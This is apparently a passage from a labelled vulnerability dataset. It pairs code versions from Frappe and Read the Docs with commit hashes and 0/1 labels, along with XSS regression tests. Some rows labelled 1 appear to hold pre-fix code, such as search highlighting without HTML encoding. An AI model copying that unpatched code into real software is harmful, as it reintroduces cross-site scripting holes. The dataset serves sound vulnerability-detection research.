from frappe.modules import load_doctype_module
from frappe.model import display_fieldtypes
from frappe.model.db_schema import type_map, varchar_len
from frappe.utils.password import get_decrypted_password, set_encrypted_password

_classes = {}

def get_controller(doctype):
	""""""Returns the **class** object of the given DocType.
	For `custom` type, returns `frappe.model.document.Document`.

	:param doctype: DocType name as string.""""""
	from frappe.model.document import Document
	global _classes

	if not doctype in _classes:
		module_name, custom = frappe.db.get_value(""DocType"", doctype, (""module"", ""custom""), cache=True) \
			or [""Core"", False]

		if custom:
			_class = Document
		else:
			module = load_doctype_module(doctype, module_name)
			classname = doctype.replace("" "", """").replace(""-"", """")
			if hasattr(module, classname):
				_class = getattr(module, classname)
				if issubclass(_class, BaseDocument):
					_class = getattr(module, classname)
				else:
					raise ImportError(doctype)
			else:
				raise ImportError(doctype)
		_classes[doctype] = _class

	return _classes[doctype]

class BaseDocument(object):
	ignore_in_getter = (""doctype"", ""_meta"", ""meta"", ""_table_fields"", ""_valid_columns"")

	def __init__(self, d):
		self.update(d)
		self.dont_update_if_missing = []

		if hasattr(self, ""__setup__""):
			self.__setup__()

	@property
	def meta(self):
		if not hasattr(self, ""_meta""):
			self._meta = frappe.get_meta(self.doctype)

		return self._meta

	def update(self, d):
		if ""doctype"" in d:
			self.set(""doctype"", d.get(""doctype""))

		# first set default field values of base document
		for key in default_fields:
			if key in d:
				self.set(key, d.get(key))

		for key, value in iteritems(d):
			self.set(key, value)

		return self

	def update_if_missing(self, d):
		if isinstance(d, BaseDocument):
			d = d.get_valid_dict()

		if ""doctype"" in d:
			self.set(""doctype"", d.get(""doctype""))
		for key, value in iteritems(d):
			# dont_update_if_missing is a list of fieldnames, for which, you don't want to set default value
			if (self.get(key) is None) and (value is not None) and (key not in self.dont_update_if_missing):
				self.set(key, value)

	def get_db_value(self, key):
		return frappe.db.get_value(self.doctype, self.name, key)

	def get(self, key=None, filters=None, limit=None, default=None):
		if key:
			if isinstance(key, dict):
				return _filter(self.get_all_children(), key, limit=limit)
			if filters:
				if isinstance(filters, dict):
					value = _filter(self.__dict__.get(key, []), filters, limit=limit)
				else:
					default = filters
					filters = None
					value = self.__dict__.get(key, default)
			else:
				value = self.__dict__.get(key, default)

			if value is None and key not in self.ignore_in_getter \
				and key in (d.fieldname for d in self.meta.get_table_fields()):
				self.set(key, [])
				value = self.__dict__.get(key)

			return value
		else:
			return self.__dict__

	def getone(self, key, filters=None):
		return self.get(key, filters=filters, limit=1)[0]

	def set(self, key, value, as_value=False):
		if isinstance(value, list) and not as_value:
			self.__dict__[key] = []
			self.extend(key, value)
		else:
			self.__dict__[key] = value

	def delete_key(self, key):
		if key in self.__dict__:
			del self.__dict__[key]

	def append(self, key, value=None):
		if value==None:
			value={}
		if isinstance(value, (dict, BaseDocument)):
			if not self.__dict__.get(key):
				self.__dict__[key] = []
			value = self._init_child(value, key)
			self.__dict__[key].append(value)

			# reference parent document
			value.parent_doc = self

			return value
		else:

			# metaclasses may have arbitrary lists
			# which we can ignore
			if (getattr(self, '_metaclass', None)
				or self.__class__.__name__ in ('Meta', 'FormMeta', 'DocField')):
				return value

			raise ValueError(
				'Document for field ""{0}"" attached to child table of ""{1}"" must be a dict or BaseDocument, not {2} ({3})'.format(key,
					self.name, str(type(value))[1:-1], value)
			)

	def extend(self, key, value):
		if isinstance(value, list):
			for v in value:
				self.append(key, v)
		else:
			raise ValueError

	def remove(self, doc):
		self.get(doc.parentfield).remove(doc)

	def _init_child(self, value, key):
		if not self.doctype:
			return value
		if not isinstance(value, BaseDocument):
			if ""doctype"" not in value:
				value[""doctype""] = self.get_table_field_doctype(key)
				if not value[""doctype""]:
					raise AttributeError(key)
			value = get_controller(value[""doctype""])(value)
			value.init_valid_columns()

		value.parent = self.name
		value.parenttype = self.doctype
		value.parentfield = key

		if value.docstatus is None:
			value.docstatus = 0

		if not getattr(value, ""idx"", None):
			value.idx = len(self.get(key) or []) + 1

		if not getattr(value, ""name"", None):
			value.__dict__['__islocal'] = 1

		return value

	def get_valid_dict(self, sanitize=True, convert_dates_to_str=False):
		d = frappe._dict()
		for fieldname in self.meta.get_valid_columns():
			d[fieldname] = self.get(fieldname)

			# if no need for sanitization and value is None, continue
			if not sanitize and d[fieldname] is None:
				continue

			df = self.meta.get_field(fieldname)
			if df:
				if df.fieldtype==""Check"":
					if d[fieldname]==None:
						d[fieldname] = 0

					elif (not isinstance(d[fieldname], int) or d[fieldname] > 1):
						d[fieldname] = 1 if cint(d[fieldname]) else 0

				elif df.fieldtype==""Int"" and not isinstance(d[fieldname], int):
					d[fieldname] = cint(d[fieldname])

				elif df.fieldtype in (""Currency"", ""Float"", ""Percent"") and not isinstance(d[fieldname], float):
					d[fieldname] = flt(d[fieldname])

				elif df.fieldtype in (""Datetime"", ""Date"", ""Time"") and d[fieldname]=="""":
					d[fieldname] = None

				elif df.get(""unique"") and cstr(d[fieldname]).strip()=="""":
					# unique empty field should be set to None
					d[fieldname] = None

				if isinstance(d[fieldname], list) and df.fieldtype != 'Table':
					frappe.throw(_('Value for {0} cannot be a list').format(_(df.label)))

				if convert_dates_to_str and isinstance(d[fieldname], (datetime.datetime, datetime.time, datetime.timedelta)):
					d[fieldname] = str(d[fieldname])

		return d

	def init_valid_columns(self):
		for key in default_fields:
			if key not in self.__dict__:
				self.__dict__[key] = None

			if key in (""idx"", ""docstatus"") and self.__dict__[key] is None:
				self.__dict__[key] = 0

		for key in self.get_valid_columns():
			if key not in self.__dict__:
				self.__dict__[key] = None

	def get_valid_columns(self):
		if self.doctype not in frappe.local.valid_columns:
			if self.doctype in (""DocField"", ""DocPerm"") and self.parent in (""DocType"", ""DocField"", ""DocPerm""):
				from frappe.model.meta import get_table_columns
				valid = get_table_columns(self.doctype)
			else:
				valid = self.meta.get_valid_columns()

			frappe.local.valid_columns[self.doctype] = valid

		return frappe.local.valid_columns[self.doctype]

	def is_new(self):
		return self.get(""__islocal"")

	def as_dict(self, no_nulls=False, no_default_fields=False, convert_dates_to_str=False):
		doc = self.get_valid_dict(convert_dates_to_str=convert_dates_to_str)
		doc[""doctype""] = self.doctype
		for df in self.meta.get_table_fields():
			children = self.get(df.fieldname) or []
			doc[df.fieldname] = [d.as_dict(no_nulls=no_nulls) for d in children]

		if no_nulls:
			for k in list(doc):
				if doc[k] is None:
					del doc[k]

		if no_default_fields:
			for k in list(doc):
				if k in default_fields:
					del doc[k]

		for key in (""_user_tags"", ""__islocal"", ""__onload"", ""_liked_by"", ""__run_link_triggers""):
			if self.get(key):
				doc[key] = self.get(key)

		return doc

	def as_json(self):
		return frappe.as_json(self.as_dict())

	def get_table_field_doctype(self, fieldname):
		return self.meta.get_field(fieldname).options

	def get_parentfield_of_doctype(self, doctype):
		fieldname = [df.fieldname for df in self.meta.get_table_fields() if df.options==doctype]
		return fieldname[0] if fieldname else None

	def db_insert(self):
		""""""INSERT the document (with valid columns) in the database.""""""
		if not self.name:
			# name will be set by document class in most cases
			set_new_name(self)

		if not self.creation:
			self.creation = self.modified = now()
			self.created_by = self.modifield_by = frappe.session.user

		d = self.get_valid_dict(convert_dates_to_str=True)

		columns = list(d)
		try:
			frappe.db.sql(""""""insert into `tab{doctype}`
				({columns}) values ({values})"""""".format(
					doctype = self.doctype,
					columns = "", "".join([""`""+c+""`"" for c in columns]),
					values = "", "".join([""%s""] * len(columns))
				), list(d.values()))
		except Exception as e:
			if e.args[0]==1062:
				if ""PRIMARY"" in cstr(e.args[1]):
					if self.meta.autoname==""hash"":
						# hash collision? try again
						self.name = None
						self.db_insert()
						return

					raise frappe.DuplicateEntryError(self.doctype, self.name, e)

				elif ""Duplicate"" in cstr(e.args[1]):
					# unique constraint
					self.show_unique_validation_message(e)
				else:
					raise
			else:
				raise
		self.set(""__islocal"", False)

	def db_update(self):
		if self.get(""__islocal"") or not self.name:
			self.db_insert()
			return

		d = self.get_valid_dict(convert_dates_to_str=True)

		# don't update name, as case might've been changed
		name = d['name']
		del d['name']

		columns = list(d)

		try:
			frappe.db.sql(""""""update `tab{doctype}`
				set {values} where name=%s"""""".format(
					doctype = self.doctype,
					values = "", "".join([""`""+c+""`=%s"" for c in columns])
				), list(d.values()) + [name])
		except Exception as e:
			if e.args[0]==1062 and ""Duplicate"" in cstr(e.args[1]):
				self.show_unique_validation_message(e)
			else:
				raise

	def show_unique_validation_message(self, e):
		type, value, traceback = sys.exc_info()
		fieldname, label = str(e).split(""'"")[-2], None

		# unique_first_fieldname_second_fieldname is the constraint name
		# created using frappe.db.add_unique
		if ""unique_"" in fieldname:
			fieldname = fieldname.split(""_"", 1)[1]

		df = self.meta.get_field(fieldname)
		if df:
			label = df.label

		frappe.msgprint(_(""{0} must be unique"".format(label or fieldname)))

		# this is used to preserve traceback
		raise frappe.UniqueValidationError(self.doctype, self.name, e)

	def update_modified(self):
		'''Update modified timestamp'''
		self.set(""modified"", now())
		frappe.db.set_value(self.doctype, self.name, 'modified', self.modified, update_modified=False)

	def _fix_numeric_types(self):
		for df in self.meta.get(""fields""):
			if df.fieldtype == ""Check"":
				self.set(df.fieldname, cint(self.get(df.fieldname)))

			elif self.get(df.fieldname) is not None:
				if df.fieldtype == ""Int"":
					self.set(df.fieldname, cint(self.get(df.fieldname)))

				elif df.fieldtype in (""Float"", ""Currency"", ""Percent""):
					self.set(df.fieldname, flt(self.get(df.fieldname)))

		if self.docstatus is not None:
			self.docstatus = cint(self.docstatus)

	def _get_missing_mandatory_fields(self):
		""""""Get mandatory fields that do not have any values""""""
		def get_msg(df):
			if df.fieldtype == ""Table"":
				return ""{}: {}: {}"".format(_(""Error""), _(""Data missing in table""), _(df.label))

			elif self.parentfield:
				return ""{}: {} {} #{}: {}: {}"".format(_(""Error""), frappe.bold(_(self.doctype)),
					_(""Row""), self.idx, _(""Value missing for""), _(df.label))

			else:
				return _(""Error: Value missing for {0}: {1}"").format(_(df.parent), _(df.label))

		missing = []

		for df in self.meta.get(""fields"", {""reqd"": ('=', 1)}):
			if self.get(df.fieldname) in (None, []) or not strip_html(cstr(self.get(df.fieldname))).strip():
				missing.append((df.fieldname, get_msg(df)))

		# check for missing parent and parenttype
		if self.meta.istable:
			for fieldname in (""parent"", ""parenttype""):
				if not self.get(fieldname):
					missing.append((fieldname, get_msg(frappe._dict(label=fieldname))))

		return missing

	def get_invalid_links(self, is_submittable=False):
		'''Returns list of invalid links and also updates fetch values if not set'''
		def get_msg(df, docname):
			if self.parentfield:
				return ""{} #{}: {}: {}"".format(_(""Row""), self.idx, _(df.label), docname)
			else:
				return ""{}: {}"".format(_(df.label), docname)

		invalid_links = []
		cancelled_links = []

		for df in (self.meta.get_link_fields()
				+ self.meta.get(""fields"", {""fieldtype"": ('=', ""Dynamic Link"")})):
			docname = self.get(df.fieldname)

			if docname:
				if df.fieldtype==""Link"":
					doctype = df.options
					if not doctype:
						frappe.throw(_(""Options not set for link field {0}"").format(df.fieldname))
				else:
					doctype = self.get(df.options)
					if not doctype:
						frappe.throw(_(""{0} must be set first"").format(self.meta.get_label(df.options)))

				# MySQL is case insensitive. Preserve case of the original docname in the Link Field.

				# get a map of values ot fetch along with this link query
				# that are mapped as link_fieldname.source_fieldname in Options of
				# Readonly or Data or Text type fields

				fields_to_fetch = [
					_df for _df in self.meta.get_fields_to_fetch(df.fieldname)
					if
						not _df.get('fetch_if_empty')
						or (_df.get('fetch_if_empty') and not self.get(_df.fieldname))
				]

				if not fields_to_fetch:
					# cache a single value type
					values = frappe._dict(name=frappe.db.get_value(doctype, docname,
						'name', cache=True))
				else:
					values_to_fetch = ['name'] + [_df.fetch_from.split('.')[-1]
						for _df in fields_to_fetch]

					# don't cache if fetching other values too
					values = frappe.db.get_value(doctype, docname,
						values_to_fetch, as_dict=True)

				if frappe.get_meta(doctype).issingle:
					values.name = doctype

				if values:
					setattr(self, df.fieldname, values.name)

					for _df in fields_to_fetch:
						if self.is_new() or self.docstatus != 1 or _df.allow_on_submit:
							setattr(self, _df.fieldname, values[_df.fetch_from.split('.')[-1]])

					notify_link_count(doctype, docname)

					if not values.name:
						invalid_links.append((df.fieldname, docname, get_msg(df, docname)))

					elif (df.fieldname != ""amended_from""
						and (is_submittable or self.meta.is_submittable) and frappe.get_meta(doctype).is_submittable
						and cint(frappe.db.get_value(doctype, docname, ""docstatus""))==2):

						cancelled_links.append((df.fieldname, docname, get_msg(df, docname)))

		return invalid_links, cancelled_links

	def _validate_selects(self):
		if frappe.flags.in_import:
			return

		for df in self.meta.get_select_fields():
			if df.fieldname==""naming_series"" or not (self.get(df.fieldname) and df.options):
				continue

			options = (df.options or """").split(""\n"")

			# if only empty options
			if not filter(None, options):
				continue

			# strip and set
			self.set(df.fieldname, cstr(self.get(df.fieldname)).strip())
			value = self.get(df.fieldname)

			if value not in options and not (frappe.flags.in_test and value.startswith(""_T-"")):
				# show an elaborate message
				prefix = _(""Row #{0}:"").format(self.idx) if self.get(""parentfield"") else """"
				label = _(self.meta.get_label(df.fieldname))
				comma_options = '"", ""'.join(_(each) for each in options)

				frappe.throw(_('{0} {1} cannot be ""{2}"". It should be one of ""{3}""').format(prefix, label,
					value, comma_options))

	def _validate_constants(self):
		if frappe.flags.in_import or self.is_new() or self.flags.ignore_validate_constants:
			return

		constants = [d.fieldname for d in self.meta.get(""fields"", {""set_only_once"": ('=',1)})]
		if constants:
			values = frappe.db.get_value(self.doctype, self.name, constants, as_dict=True)

		for fieldname in constants:
			df = self.meta.get_field(fieldname)

			# This conversion to string only when fieldtype is Date
			if df.fieldtype == 'Date' or df.fieldtype == 'Datetime':
				value = str(values.get(fieldname))

			else:
				value  = values.get(fieldname)

			if self.get(fieldname) != value:
				frappe.throw(_(""Value cannot be changed for {0}"").format(self.meta.get_label(fieldname)),
					frappe.CannotChangeConstantError)

	def _validate_length(self):
		if frappe.flags.in_install:
			return

		if self.meta.issingle:
			# single doctype value type is mediumtext
			return

		column_types_to_check_length = ('varchar', 'int', 'bigint')

		for fieldname, value in iteritems(self.get_valid_dict()):
			df = self.meta.get_field(fieldname)

			if not df or df.fieldtype == 'Check':
				# skip standard fields and Check fields
				continue

			column_type = type_map[df.fieldtype][0] or None
			default_column_max_length = type_map[df.fieldtype][1] or None

			if df and df.fieldtype in type_map and column_type in column_types_to_check_length:
				max_length = cint(df.get(""length"")) or cint(default_column_max_length)

				if len(cstr(value)) > max_length:
					if self.parentfield and self.idx:
						reference = _(""{0}, Row {1}"").format(_(self.doctype), self.idx)

					else:
						reference = ""{0} {1}"".format(_(self.doctype), self.name)

					frappe.throw(_(""{0}: '{1}' ({3}) will get truncated, as max characters allowed is {2}"")\
						.format(reference, _(df.label), max_length, value), frappe.CharacterLengthExceededError, title=_('Value too big'))

	def _validate_update_after_submit(self):
		# get the full doc with children
		db_values = frappe.get_doc(self.doctype, self.name).as_dict()

		for key in self.as_dict():
			df = self.meta.get_field(key)
			db_value = db_values.get(key)

			if df and not df.allow_on_submit and (self.get(key) or db_value):
				if df.fieldtype==""Table"":
					# just check if the table size has changed
					# individual fields will be checked in the loop for children
					self_value = len(self.get(key))
					db_value = len(db_value)

				else:
					self_value = self.get_value(key)

				if self_value != db_value:
					frappe.throw(_(""Not allowed to change {0} after submission"").format(df.label),
						frappe.UpdateAfterSubmitError)

	def _sanitize_content(self):
		""""""Sanitize HTML and Email in field values. Used to prevent XSS.

			- Ignore if 'Ignore XSS Filter' is checked or fieldtype is 'Code'
		""""""
		if frappe.flags.in_install:
			return

		for fieldname, value in self.get_valid_dict().items():
			if not value or not isinstance(value, string_types):
				continue

			value = frappe.as_unicode(value)

			if (u""<"" not in value and u"">"" not in value):
				# doesn't look like html so no need
				continue

			elif ""<!-- markdown -->"" in value and not (""<script"" in value or ""javascript:"" in value):
				# should be handled separately via the markdown converter function
				continue

			df = self.meta.get_field(fieldname)
			sanitized_value = value

			if df and df.get(""fieldtype"") in (""Data"", ""Code"", ""Small Text"") and df.get(""options"")==""Email"":
				sanitized_value = sanitize_email(value)

			elif df and (df.get(""ignore_xss_filter"")
						or (df.get(""fieldtype"")==""Code"" and df.get(""options"")!=""Email"")
						or df.get(""fieldtype"") in (""Attach"", ""Attach Image"")

						# cancelled and submit but not update after submit should be ignored
						or self.docstatus==2
						or (self.docstatus==1 and not df.get(""allow_on_submit""))):
				continue

			else:
				sanitized_value = sanitize_html(value, linkify=df.fieldtype=='Text Editor')

			self.set(fieldname, sanitized_value)

	def _save_passwords(self):
		'''Save password field values in __Auth table'''
		if self.flags.ignore_save_passwords is True:
			return

		for df in self.meta.get('fields', {'fieldtype': ('=', 'Password')}):
			if self.flags.ignore_save_passwords and df.fieldname in self.flags.ignore_save_passwords: continue
			new_password = self.get(df.fieldname)
			if new_password and not self.is_dummy_password(new_password):
				# is not a dummy password like '*****'
				set_encrypted_password(self.doctype, self.name, new_password, df.fieldname)

				# set dummy password like '*****'
				self.set(df.fieldname, '*'*len(new_password))

	def get_password(self, fieldname='password', raise_exception=True):
		if self.get(fieldname) and not self.is_dummy_password(self.get(fieldname)):
			return self.get(fieldname)

		return get_decrypted_password(self.doctype, self.name, fieldname, raise_exception=raise_exception)

	def is_dummy_password(self, pwd):
		return ''.join(set(pwd))=='*'

	def precision(self, fieldname, parentfield=None):
		""""""Returns float precision for a particular field (or get global default).

		:param fieldname: Fieldname for which precision is required.
		:param parentfield: If fieldname is in child table.""""""
		from frappe.model.meta import get_field_precision

		if parentfield and not isinstance(parentfield, string_types):
			parentfield = parentfield.parentfield

		cache_key = parentfield or ""main""

		if not hasattr(self, ""_precision""):
			self._precision = frappe._dict()

		if cache_key not in self._precision:
			self._precision[cache_key] = frappe._dict()

		if fieldname not in self._precision[cache_key]:
			self._precision[cache_key][fieldname] = None

			doctype = self.meta.get_field(parentfield).options if parentfield else self.doctype
			df = frappe.get_meta(doctype).get_field(fieldname)

			if df.fieldtype in (""Currency"", ""Float"", ""Percent""):
				self._precision[cache_key][fieldname] = get_field_precision(df, self)

		return self._precision[cache_key][fieldname]


	def get_formatted(self, fieldname, doc=None, currency=None, absolute_value=False, translated=False):
		from frappe.utils.formatters import format_value

		df = self.meta.get_field(fieldname)
		if not df and fieldname in default_fields:
			from frappe.model.meta import get_default_df
			df = get_default_df(fieldname)

		val = self.get(fieldname)

		if translated:
			val = _(val)

		if absolute_value and isinstance(val, (int, float)):
			val = abs(self.get(fieldname))

		if not doc:
			doc = getattr(self, ""parent_doc"", None) or self

		return format_value(val, df=df, doc=doc, currency=currency)

	def is_print_hide(self, fieldname, df=None, for_print=True):
		""""""Returns true if fieldname is to be hidden for print.

		Print Hide can be set via the Print Format Builder or in the controller as a list
		of hidden fields. Example

			class MyDoc(Document):
				def __setup__(self):
					self.print_hide = [""field1"", ""field2""]

		:param fieldname: Fieldname to be checked if hidden.
		""""""
		meta_df = self.meta.get_field(fieldname)
		if meta_df and meta_df.get(""__print_hide""):
			return True

		print_hide = 0

		if self.get(fieldname)==0 and not self.meta.istable:
			print_hide = ( df and df.print_hide_if_no_value ) or ( meta_df and meta_df.print_hide_if_no_value )

		if not print_hide:
			if df and df.print_hide is not None:
				print_hide = df.print_hide
			elif meta_df:
				print_hide = meta_df.print_hide

		return print_hide

	def in_format_data(self, fieldname):
		""""""Returns True if shown via Print Format::`format_data` property.
			Called from within standard print format.""""""
		doc = getattr(self, ""parent_doc"", self)

		if hasattr(doc, ""format_data_map""):
			return fieldname in doc.format_data_map
		else:
			return True

	def reset_values_if_no_permlevel_access(self, has_access_to, high_permlevel_fields):
		""""""If the user does not have permissions at permlevel > 0, then reset the values to original / default""""""
		to_reset = []

		for df in high_permlevel_fields:
			if df.permlevel not in has_access_to and df.fieldtype not in display_fieldtypes:
				to_reset.append(df)

		if to_reset:
			if self.is_new():
				# if new, set default value
				ref_doc = frappe.new_doc(self.doctype)
			else:
				# get values from old doc
				if self.get('parent_doc'):
					self.parent_doc.get_latest()
					ref_doc = [d for d in self.parent_doc.get(self.parentfield) if d.name == self.name][0]
				else:
					ref_doc = self.get_latest()

			for df in to_reset:
				self.set(df.fieldname, ref_doc.get(df.fieldname))

	def get_value(self, fieldname):
		df = self.meta.get_field(fieldname)
		val = self.get(fieldname)

		return self.cast(val, df)

	def cast(self, value, df):
		return cast_fieldtype(df.fieldtype, value)

	def _extract_images_from_text_editor(self):
		from frappe.utils.file_manager import extract_images_from_doc
		if self.doctype != ""DocType"":
			for df in self.meta.get(""fields"", {""fieldtype"": ('=', ""Text Editor"")}):
				extract_images_from_doc(self, df.fieldname)

def _filter(data, filters, limit=None):
	""""""pass filters as:
		{""key"": ""val"", ""key"": [""!="", ""val""],
		""key"": [""in"", ""val""], ""key"": [""not in"", ""val""], ""key"": ""^val"",
		""key"" : True (exists), ""key"": False (does not exist) }""""""

	out, _filters = [], {}

	if not data:
		return out

	# setup filters as tuples
	if filters:
		for f in filters:
			fval = filters[f]

			if not isinstance(fval, (tuple, list)):
				if fval is True:
					fval = (""not None"", fval)
				elif fval is False:
					fval = (""None"", fval)
				elif isinstance(fval, string_types) and fval.startswith(""^""):
					fval = (""^"", fval[1:])
				else:
					fval = (""="", fval)

			_filters[f] = fval

	for d in data:
		add = True
		for f, fval in iteritems(_filters):
			if not frappe.compare(getattr(d, f, None), fval[0], fval[1]):
				add = False
				break

		if add:
			out.append(d)
			if limit and (len(out)-1)==limit:
				break

	return out
/n/n/n",1
74,1ebe494ffde18109307f205d2bd94102452f697a,"readthedocs/search/documents.py/n/nfrom django.conf import settings
from django_elasticsearch_dsl import DocType, Index, fields
from elasticsearch_dsl.query import SimpleQueryString, Bool

from readthedocs.projects.models import Project, HTMLFile
from readthedocs.search.faceted_search import ProjectSearch, FileSearch
from .mixins import RTDDocTypeMixin

project_conf = settings.ES_INDEXES['project']
project_index = Index(project_conf['name'])
project_index.settings(**project_conf['settings'])

page_conf = settings.ES_INDEXES['page']
page_index = Index(page_conf['name'])
page_index.settings(**page_conf['settings'])


@project_index.doc_type
class ProjectDocument(RTDDocTypeMixin, DocType):

    class Meta(object):
        model = Project
        fields = ('name', 'slug', 'description')
        ignore_signals = settings.ES_PROJECT_IGNORE_SIGNALS

    url = fields.TextField(attr='get_absolute_url')
    users = fields.NestedField(properties={
        'username': fields.TextField(),
        'id': fields.IntegerField(),
    })
    language = fields.KeywordField()

    @classmethod
    def faceted_search(cls, query, language=None, using=None, index=None):
        kwargs = {
            'using': using or cls._doc_type.using,
            'index': index or cls._doc_type.index,
            'doc_types': [cls],
            'model': cls._doc_type.model,
            'query': query
        }

        if language:
            kwargs['filters'] = {'language': language}

        return ProjectSearch(**kwargs)


@page_index.doc_type
class PageDocument(RTDDocTypeMixin, DocType):

    class Meta(object):
        model = HTMLFile
        fields = ('commit',)
        ignore_signals = settings.ES_PAGE_IGNORE_SIGNALS

    project = fields.KeywordField(attr='project.slug')
    version = fields.KeywordField(attr='version.slug')

    title = fields.TextField(attr='processed_json.title')
    headers = fields.TextField(attr='processed_json.headers')
    content = fields.TextField(attr='processed_json.content')
    path = fields.KeywordField(attr='processed_json.path')

    # Fields to perform search with weight
    search_fields = ['title^10', 'headers^5', 'content']
    # Exclude some files to not index
    excluded_files = ['search.html', 'genindex.html', 'py-modindex.html']

    @classmethod
    def faceted_search(cls, query, projects_list=None, versions_list=None, using=None, index=None):
        es_query = cls.get_es_query(query=query)
        kwargs = {
            'using': using or cls._doc_type.using,
            'index': index or cls._doc_type.index,
            'doc_types': [cls],
            'model': cls._doc_type.model,
            'query': es_query,
            'fields': cls.search_fields
        }
        filters = {}

        if projects_list:
            filters['project'] = projects_list
        if versions_list:
            filters['version'] = versions_list

        kwargs['filters'] = filters

        return FileSearch(**kwargs)

    @classmethod
    def simple_search(cls, query, using=None, index=None):
        """"""
        Do a search without facets.

        This is used in:

        * The Docsearch API
        * The Project Admin Search page
        """"""

        es_search = cls.search(using=using, index=index)
        es_search = es_search.highlight_options(encoder='html')

        es_query = cls.get_es_query(query=query)
        highlighted_fields = [f.split('^', 1)[0] for f in cls.search_fields]
        es_search = es_search.query(es_query).highlight(*highlighted_fields)

        return es_search

    @classmethod
    def get_es_query(cls, query):
        """"""Return the Elasticsearch query generated from the query string""""""
        all_queries = []

        # Need to search for both 'AND' and 'OR' operations
        # The score of AND should be higher as it satisfies both OR and AND
        for operator in ['OR']:
            # TODO: readd this, testing removal for performance
            # for operator in ['AND', 'OR']:
            query_string = SimpleQueryString(query=query, fields=cls.search_fields,
                                             default_operator=operator)
            all_queries.append(query_string)

        # Run bool query with should, so it returns result where either of the query matches
        bool_query = Bool(should=all_queries)

        return bool_query

    def get_queryset(self):
        """"""Overwrite default queryset to filter certain files to index""""""
        queryset = super(PageDocument, self).get_queryset()

        # Do not index files that belong to non sphinx project
        # Also do not index certain files
        queryset = (queryset.filter(project__documentation_type__contains='sphinx')
                            .exclude(name__in=self.excluded_files))
        return queryset
/n/n/nreadthedocs/search/faceted_search.py/n/nfrom elasticsearch_dsl import FacetedSearch, TermsFacet


class RTDFacetedSearch(FacetedSearch):

    """"""Overwrite the initialization in order too meet our needs""""""

    # TODO: Remove the overwrite when the elastic/elasticsearch-dsl-py#916
    # See more: https://github.com/elastic/elasticsearch-dsl-py/issues/916

    def __init__(self, using, index, doc_types, model, fields=None, **kwargs):
        self.using = using
        self.index = index
        self.doc_types = doc_types
        self._model = model
        if fields:
            self.fields = fields
        super(RTDFacetedSearch, self).__init__(**kwargs)


class ProjectSearch(RTDFacetedSearch):
    fields = ['name^5', 'description']
    facets = {
        'language': TermsFacet(field='language')
    }


class FileSearch(RTDFacetedSearch):
    facets = {
        'project': TermsFacet(field='project'),
        'version': TermsFacet(field='version')
    }

    def query(self, search, query):
        """"""
        Add query part to ``search``

        Overriding because we pass ES Query object instead of string
        """"""
        search = search.highlight_options(encoder='html')
        if query:
            search = search.query(query)

        return search
/n/n/n",0
75,1ebe494ffde18109307f205d2bd94102452f697a,"/readthedocs/search/faceted_search.py/n/nfrom elasticsearch_dsl import FacetedSearch, TermsFacet
from elasticsearch_dsl.query import SimpleQueryString, Bool


class RTDFacetedSearch(FacetedSearch):

    """"""Overwrite the initialization in order too meet our needs""""""

    # TODO: Remove the overwrite when the elastic/elasticsearch-dsl-py#916
    # See more: https://github.com/elastic/elasticsearch-dsl-py/issues/916

    def __init__(self, using, index, doc_types, model, fields=None, **kwargs):
        self.using = using
        self.index = index
        self.doc_types = doc_types
        self._model = model
        if fields:
            self.fields = fields
        super(RTDFacetedSearch, self).__init__(**kwargs)


class ProjectSearch(RTDFacetedSearch):
    fields = ['name^5', 'description']
    facets = {
        'language': TermsFacet(field='language')
    }


class FileSearch(RTDFacetedSearch):
    facets = {
        'project': TermsFacet(field='project'),
        'version': TermsFacet(field='version')
    }

    def query(self, search, query):
        """"""
        Add query part to ``search``

        Overriding because we pass ES Query object instead of string
        """"""
        if query:
            search = search.query(query)

        return search
/n/n/n",1
76,13ca0161273c368fdb6a51900a9c08917115307b,"readthedocs/search/tests/test_xss.py/n/nimport pytest

from readthedocs.search.documents import PageDocument


@pytest.mark.django_db
@pytest.mark.search
class TestXSS:

    def test_facted_page_xss(self, client, project):
        query = 'XSS'
        page_search = PageDocument.faceted_search(query=query, user='')
        results = page_search.execute()
        expected = """"""
        &lt;h3&gt;<em>XSS</em> exploit&lt;&#x2F;h3&gt;
        """""".strip()

        hits = results.hits.hits
        assert len(hits) == 1  # there should be only one result

        inner_hits = hits[0]['inner_hits']

        domain_hits = inner_hits['domains']['hits']['hits']
        assert len(domain_hits) == 0  # there shouldn't be any results from domains

        section_hits = inner_hits['sections']['hits']['hits']
        assert len(section_hits) == 1

        section_content_highlight = section_hits[0]['highlight']['sections.content']
        assert len(section_content_highlight) == 1

        assert expected in section_content_highlight[0]
/n/n/n",0
77,13ca0161273c368fdb6a51900a9c08917115307b,"/readthedocs/search/tests/test_xss.py/n/nimport pytest

from readthedocs.search.documents import PageDocument


@pytest.mark.django_db
@pytest.mark.search
class TestXSS:

    def test_facted_page_xss(self, client, project):
        query = 'XSS'
        page_search = PageDocument.faceted_search(query=query, user='')
        results = page_search.execute()
        expected = """"""
        &lt;h3&gt;<em>XSS</em> exploit&lt;&#x2F;h3&gt;
        """""".strip()
        assert results[0].meta.highlight.content[0][:len(expected)] == expected
/n/n/n",1
78,ebdcf9913f5ab48e121b24c28d1c2a58d2975a9e,"readthedocs/search/tests/test_xss.py/n/nimport pytest

from readthedocs.search.documents import PageDocument


@pytest.mark.django_db
@pytest.mark.search
class TestXSS:

    def test_facted_page_xss(self, client, project):
        query = 'XSS'
        page_search = PageDocument.faceted_search(query=query, user='')
        results = page_search.execute()
        expected = """"""
        &lt;h3&gt;<span>XSS</span> exploit&lt;&#x2F;h3&gt;
        """""".strip()

        hits = results.hits.hits
        assert len(hits) == 1  # there should be only one result

        inner_hits = hits[0]['inner_hits']

        domain_hits = inner_hits['domains']['hits']['hits']
        assert len(domain_hits) == 0  # there shouldn't be any results from domains

        section_hits = inner_hits['sections']['hits']['hits']
        assert len(section_hits) == 1

        section_content_highlight = section_hits[0]['highlight']['sections.content']
        assert len(section_content_highlight) == 1

        assert expected in section_content_highlight[0]
/n/n/n",0
79,ebdcf9913f5ab48e121b24c28d1c2a58d2975a9e,"/readthedocs/search/tests/test_xss.py/n/nimport pytest

from readthedocs.search.documents import PageDocument


@pytest.mark.django_db
@pytest.mark.search
class TestXSS:

    def test_facted_page_xss(self, client, project):
        query = 'XSS'
        page_search = PageDocument.faceted_search(query=query, user='')
        results = page_search.execute()
        expected = """"""
        &lt;h3&gt;<em>XSS</em> exploit&lt;&#x2F;h3&gt;
        """""".strip()

        hits = results.hits.hits
        assert len(hits) == 1  # there should be only one result

        inner_hits = hits[0]['inner_hits']

        domain_hits = inner_hits['domains']['hits']['hits']
        assert len(domain_hits) == 0  # there shouldn't be any results from domains

